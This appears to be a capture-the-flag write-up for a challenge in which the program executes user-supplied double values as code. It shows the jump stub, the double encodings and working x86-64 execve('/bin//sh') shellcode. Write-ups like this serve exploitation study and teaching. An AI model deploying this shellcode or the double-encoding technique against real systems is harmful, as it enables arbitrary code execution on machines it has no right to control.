# double_easy
This is simple but yet in my opinion fun enough task.
At the begging called nmap. It creates rwxp mapping. User input getting placed at 0x7ffff7ff6000. 
![](/images/random_tasks/double_easy/01.png)

![](/images/random_tasks/double_easy/02.png)

At the end most registers getting xord and we jmp into rax .

![](/images/random_tasks/double_easy/03.png)

The goal here is to combine double values into a shellcode.

When jmp rax happens rax = 0x7ffff7ff6800

Double value with maximum exponent is placed at that address. So we need to jmp from there to the begging of our shellcode ie. to 0x7ffff7ff6000.

0:  48 2d 00 08 00 00       sub    rax,0x800
6:  ff e0                               jmp    rax

I used http://www.binaryconvert.com/convert_double.html to convert hex values to doubles.

482d00080000ffe0 -> e0ff000008002d48 = -1.70246984590177777930935029465E159

So I tried it but in gdb I noticed that value at 0x7ffff7ff6800 was changed to e0cf000008002d48. 

0xe0f - 0x3 = 0xe0c => we should place 0xe0f + 0x3 = 0xe12 => e12f000008002d48

e12f000008002d48 = -1.36197587672142222344748023572E160

This worked.
![](/images/random_tasks/double_easy/04.png)

I used following shellcode:
![](/images/random_tasks/double_easy/05.png)

Setting rsp to 0x7ffff7ff6600 at start there.

sc = "\x48\x05\x00\x06\x00\x00\x48\x89\xC4\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x99\x52\x57\x54\x5E\xB0\x3B\x0F\x05"

9090909048050006  -> 0600054890909090 = 8.82579544590269863191205692881E-280
00004889C431C048  -> 48C031C489480000 = 2.82146330475893377060216454638E42
BBD19D9691D08C97  -> 978CD091969DD1BB = -3.08380742074420402109506446037E-195
FF48F7DB53545F99  -> 995F5453DBF748FF = -1.80009256564271863951964737918E-186
5257545EB03B0F05  -> 050F3BB05E545752 = 2.62548796026479771567446783154E-284

![](/images/random_tasks/double_easy/06.png)